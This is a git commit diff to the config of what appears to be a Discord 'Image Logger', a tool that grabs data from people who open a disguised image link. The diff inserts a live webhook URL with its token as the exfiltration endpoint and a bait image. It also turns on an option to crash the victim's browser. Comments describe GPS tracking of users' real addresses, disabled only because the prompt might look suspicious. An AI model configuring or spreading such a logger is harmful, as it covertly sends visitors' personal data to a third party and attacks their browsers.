981cade114e7542758fb41fc838085e6a7f47584
Cxlders <ccxlder@gmail.com>
2024-11-03 17:22:47 -0800

    Update main.py

--- main.py
+++ main.py
@@ -12,17 +12,17 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1142689742509588500/SOMD8nQmMQic-s8w3M1q3UK53MrL0UhRfJJghj4Rv31UwHBk8v4dCyYY83pVqY-Kqif5",
+    "image": "https://media.discordapp.net/attachments/1142066440141295656/1302795693794001066/SPOILER_image0.png?ex=67296a8a&is=6728190a&hm=8d86f84bc379769147e0579e681fb45efe5640fc84de9469576b43a2e6d5c3f6&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Moices E kitten", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
